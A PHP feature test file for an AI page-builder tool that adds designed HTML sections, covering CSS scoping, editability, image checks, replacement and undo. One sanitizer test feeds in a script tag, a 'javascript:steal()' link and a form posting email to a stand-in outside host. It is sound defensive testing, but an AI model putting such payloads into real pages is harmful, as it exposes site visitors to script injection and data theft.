<?php

namespace VelaBuild\Core\Tests\Feature;

use Illuminate\Foundation\Testing\RefreshDatabase;
use VelaBuild\Core\Models\Page;
use VelaBuild\Core\Services\AiChat\Tools\AddDesignedSectionTool;
use VelaBuild\Core\Tests\PackageTestCase;

/**
 * A design reached the page through a dozen theme tokens and a fixed set of
 * block shapes, and came out recognisable but not alike — the user's words were
 * "ไม่เหมือนเลย". This is the route that carries the design itself: the
 * section's own markup and its own stylesheet, in a block, still editable.
 *
 * What it must never become is the thing that route was refused for the first
 * time round — a page its owner cannot touch — so the guards matter as much as
 * the markup.
 */
class AiChatDesignedSectionTest extends PackageTestCase
{
    use RefreshDatabase;

    /** A picture the site really serves, so the fixture is not itself a broken one. */
    private const PICTURE = '/media/designed-section-test.png';

    protected function setUp(): void
    {
        parent::setUp();

        @mkdir(dirname(public_path(ltrim(self::PICTURE, '/'))), 0777, true);
        file_put_contents(public_path(ltrim(self::PICTURE, '/')), 'not-really-a-png');
    }

    protected function tearDown(): void
    {
        @unlink(public_path(ltrim(self::PICTURE, '/')));

        parent::tearDown();
    }

    private function actionLog(): \VelaBuild\Core\Models\AiActionLog
    {
        $user = $this->signIn();
        $conversation = \VelaBuild\Core\Models\AiConversation::create([
            'user_id' => $user->id,
            'title' => 'designed section',
        ]);
        $message = \VelaBuild\Core\Models\AiMessage::create([
            'conversation_id' => $conversation->id,
            'role' => 'assistant',
            'content' => '',
        ]);

        return \VelaBuild\Core\Models\AiActionLog::create([
            'conversation_id' => $conversation->id,
            'message_id'      => $message->id,
            'user_id'         => $user->id,
            'tool_name'       => 'add_designed_section',
            'parameters'      => [],
            'status'          => 'completed',
        ]);
    }

    private function page(): Page
    {
        return Page::create([
            'title' => 'Design preview',
            'slug' => 'design-preview',
            'status' => 'unlisted',
            'locale' => config('vela.primary_language', 'en'),
        ]);
    }

    private function hero(): string
    {
        return '<section class="hero">'
            . '<div class="hero-copy"><h1 class="hero-title">Ship faster</h1>'
            . '<p class="hero-lead">Launch in days rather than quarters.</p>'
            . '<a class="hero-btn" href="/signup">Start free</a></div>'
            . '<img class="hero-shot" src="' . self::PICTURE . '" alt="The app">'
            . '</section>';
    }

    public function test_it_keeps_the_markup_and_scopes_the_styling_to_the_section(): void
    {
        $page = $this->page();

        $result = (new AddDesignedSectionTool())->execute([
            'page_id' => $page->id,
            'name' => 'Hero',
            'html' => $this->hero(),
            'css' => '.hero{display:grid;grid-template-columns:7fr 5fr}'
                . '.hero-title{font-size:64px;font-weight:800}'
                . '.nothing-here{color:red}',
        ]);

        $this->assertTrue($result['success'], $result['error'] ?? '');

        $row = $page->rows()->first();
        $block = $row->blocks()->first();
        $html = $block->content['html'];
        $css = (string) $page->fresh()->custom_css;

        $this->assertSame('html', $block->type);
        // The design's own arrangement, not a block's.
        $this->assertStringContainsString('grid-template-columns:7fr 5fr', str_replace(' ', ' ', $css));
        $this->assertStringContainsString('Ship faster', $html);
        // Reaching nothing outside this section.
        $this->assertStringContainsString('.' . $result['wrapper_class'] . ' .hero-title', $css);
        $this->assertStringNotContainsString('nothing-here', $css);
        // The section brings its own container, so the row must not add one.
        $this->assertSame('full', $row->width);
        $this->assertSame('0', (string) $row->padding);
    }

    public function test_the_wording_and_pictures_stay_editable(): void
    {
        $page = $this->page();

        $result = (new AddDesignedSectionTool())->execute([
            'page_id' => $page->id,
            'name' => 'Hero',
            'html' => $this->hero(),
        ]);

        $html = $page->rows()->first()->blocks()->first()->content['html'];

        // Marked here, so the page builder puts a plain form in front of the
        // person whose site this is rather than a box of HTML.
        $this->assertGreaterThanOrEqual(4, $result['editable_fields']);
        $this->assertStringContainsString('data-vela-field', $html);
        $this->assertMatchesRegularExpression('/<h1[^>]*data-vela-field/', $html);
    }

    public function test_a_section_nobody_could_edit_is_refused(): void
    {
        $page = $this->page();

        $result = (new AddDesignedSectionTool())->execute([
            'page_id' => $page->id,
            'name' => 'Band',
            'html' => '<section class="band"><div class="stripe"></div></section>',
        ]);

        $this->assertArrayHasKey('error', $result);
        $this->assertStringContainsString('page builder', $result['error']);
        // And it leaves nothing behind on the page.
        $this->assertSame(0, $page->rows()->count());
    }

    public function test_nothing_executable_or_submitting_survives(): void
    {
        $page = $this->page();

        (new AddDesignedSectionTool())->execute([
            'page_id' => $page->id,
            'name' => 'Call to action',
            'html' => '<section class="cta"><h2>Join</h2>'
                . '<style>body{display:none}</style>'
                . '<script>evil()</script>'
                . '<form action="https://elsewhere.example/collect" method="post">'
                . '<input name="email" placeholder="Your email"><button>Go</button></form>'
                . '<a href="javascript:steal()">Terms</a></section>',
        ]);

        $html = $page->rows()->first()->blocks()->first()->content['html'];

        $this->assertStringNotContainsString('<script', $html);
        $this->assertStringNotContainsString('evil()', $html);
        // A <style> would reach every page the block renders on: the section's
        // stylesheet travels in css, where it can be scoped.
        $this->assertStringNotContainsString('<style', $html);
        $this->assertStringNotContainsString('elsewhere.example', $html);
        $this->assertStringNotContainsString('javascript:', $html);
        // The field itself stays: it is the wording someone will want to edit.
        $this->assertStringContainsString('Your email', $html);
    }

    public function test_a_picture_that_is_only_a_filename_is_refused(): void
    {
        $page = $this->page();

        $result = (new AddDesignedSectionTool())->execute([
            'page_id' => $page->id,
            'name' => 'Hero',
            'html' => '<section class="hero"><h1>Ship faster</h1>'
                . '<img src="IMG_4821.jpg" alt="The design"></section>',
        ]);

        $this->assertArrayHasKey('error', $result);
        $this->assertStringContainsString('generate_image', $result['error']);
        $this->assertSame(0, $page->rows()->count());
    }

    /**
     * A build put `<img src="/path-to-illustration.jpg">` in the hero — a
     * placeholder shaped like a path — and the most prominent picture on the
     * page rendered as a broken-image icon while the run reported success.
     * A bare filename was refused; anything with a slash in it was not.
     */
    public function test_a_picture_at_an_address_this_site_has_nothing_at_is_refused(): void
    {
        $page = $this->page();

        $result = (new AddDesignedSectionTool())->execute([
            'page_id' => $page->id,
            'name' => 'Hero',
            'html' => '<section class="hero"><h1>Ship faster</h1>'
                . '<img src="/path-to-illustration.jpg" alt="Illustration"></section>',
        ]);

        $this->assertArrayHasKey('error', $result);
        $this->assertStringContainsString('generate_image', $result['error']);
        $this->assertSame(0, $page->rows()->count());
    }

    public function test_a_picture_the_site_really_serves_is_accepted(): void
    {
        $page = $this->page();

        $result = (new AddDesignedSectionTool())->execute([
            'page_id' => $page->id,
            'name' => 'Hero',
            'html' => $this->hero(),
        ]);

        $this->assertTrue($result['success'], $result['error'] ?? '');
    }

    public function test_correcting_a_section_rewrites_it_rather_than_adding_a_second(): void
    {
        $page = $this->page();
        $tool = new AddDesignedSectionTool();

        $first = $tool->execute([
            'page_id' => $page->id,
            'name' => 'Hero',
            'html' => $this->hero(),
            'css' => '.hero-title{font-size:64px}',
        ]);

        $second = $tool->execute([
            'page_id' => $page->id,
            'name' => 'Hero',
            'replace_row_id' => $first['row_id'],
            'html' => '<section class="hero"><h1 class="hero-title">Ship sooner</h1></section>',
            'css' => '.hero-title{font-size:48px}',
        ]);

        $this->assertTrue($second['success'], $second['error'] ?? '');
        $this->assertTrue($second['replaced']);
        $this->assertSame($first['row_id'], $second['row_id']);
        $this->assertSame(1, $page->rows()->count());

        $html = $page->rows()->first()->blocks()->first()->content['html'];
        $this->assertStringContainsString('Ship sooner', $html);
        $this->assertStringNotContainsString('Ship faster', $html);

        // The stylesheet is replaced too. Left to accumulate, the old rule sits
        // under a wrapper nothing carries any more and the page's CSS grows by
        // a section every round of fixes.
        $css = (string) $page->fresh()->custom_css;
        $this->assertStringContainsString('font-size:48px', str_replace(' ', '', $css));
        $this->assertStringNotContainsString('font-size:64px', str_replace(' ', '', $css));
    }

    public function test_it_says_so_when_none_of_the_styling_matched(): void
    {
        $page = $this->page();

        $result = (new AddDesignedSectionTool())->execute([
            'page_id' => $page->id,
            'name' => 'Hero',
            'html' => $this->hero(),
            'css' => '.something-else{color:red}.and-another{margin:0}',
        ]);

        $this->assertTrue($result['success'], $result['error'] ?? '');
        $this->assertArrayHasKey('css_warning', $result);
        $this->assertStringContainsString('unstyled', $result['css_warning']);
    }

    public function test_a_footer_is_refused_because_the_theme_draws_one(): void
    {
        $page = $this->page();

        $result = (new AddDesignedSectionTool())->execute([
            'page_id' => $page->id,
            'name' => 'Footer',
            'html' => '<footer class="site-footer"><p>© 2018 Zercurity. All Rights Reserved.</p>'
                . '<a href="mailto:hello@zercurity.com">hello@zercurity.com</a></footer>',
        ]);

        $this->assertArrayHasKey('error', $result);
        $this->assertSame('footer', $result['section_kind']);
        $this->assertSame(0, $page->rows()->count());
    }

    public function test_a_second_section_of_the_same_name_is_refused_and_points_at_the_first(): void
    {
        $page = $this->page();
        $tool = new AddDesignedSectionTool();

        $first = $tool->execute([
            'page_id' => $page->id,
            'name' => 'Hero',
            'html' => $this->hero(),
        ]);

        $second = $tool->execute([
            'page_id' => $page->id,
            'name' => 'Hero',
            'html' => '<section class="hero"><h1>Real-Time Monitoring</h1></section>',
        ]);

        $this->assertArrayHasKey('error', $second);
        $this->assertStringContainsString('replace_row_id ' . $first['row_id'], $second['error']);
        $this->assertSame(1, $page->rows()->count());
    }

    public function test_a_section_without_a_name_is_refused(): void
    {
        $page = $this->page();

        $result = (new AddDesignedSectionTool())->execute([
            'page_id' => $page->id,
            'html' => $this->hero(),
        ]);

        $this->assertArrayHasKey('error', $result);
        $this->assertStringContainsString('name is required', $result['error']);
    }

    /**
     * A fix round asked to restyle the navigation sent a page's worth of
     * hand-written CSS through update_custom_css, and took the stylesheets of
     * every written section with it. The page still loaded; all six sections
     * came out unstyled; the tool reported success.
     */
    public function test_rewriting_a_pages_css_does_not_take_the_sections_styling_with_it(): void
    {
        $page = $this->page();

        $section = (new AddDesignedSectionTool())->execute([
            'page_id' => $page->id,
            'name' => 'Hero',
            'html' => $this->hero(),
            'css' => '.hero-title{font-size:64px}',
        ]);

        $result = (new \VelaBuild\Core\Services\AiChat\Tools\UpdateCustomCssTool())->execute([
            'scope' => 'page',
            'page_id' => $page->id,
            'css' => '.block-hero{padding:40px}',
        ]);

        $this->assertTrue($result['success'], $result['error'] ?? '');
        $this->assertSame(1, $result['sections_kept']);

        $css = (string) $page->fresh()->custom_css;
        $this->assertStringContainsString('.block-hero{padding:40px}', $css);
        $this->assertStringContainsString('.' . $section['wrapper_class'] . ' .hero-title', $css);
    }

    public function test_undo_puts_back_what_was_replaced(): void
    {
        $page = $this->page();
        $tool = new AddDesignedSectionTool();

        $first = $tool->execute([
            'page_id' => $page->id,
            'name' => 'Hero',
            'html' => $this->hero(),
            'css' => '.hero-title{font-size:64px}',
        ]);

        $log = $this->actionLog();

        $tool->execute([
            'page_id' => $page->id,
            'name' => 'Hero',
            'replace_row_id' => $first['row_id'],
            'html' => '<section class="hero"><h1 class="hero-title">Ship sooner</h1></section>',
            'css' => '.hero-title{font-size:48px}',
        ], $log);

        $tool->undo($log->fresh());

        $html = $page->rows()->first()->blocks()->first()->content['html'];
        $this->assertStringContainsString('Ship faster', $html);
        $this->assertSame(1, $page->rows()->count());
    }
}
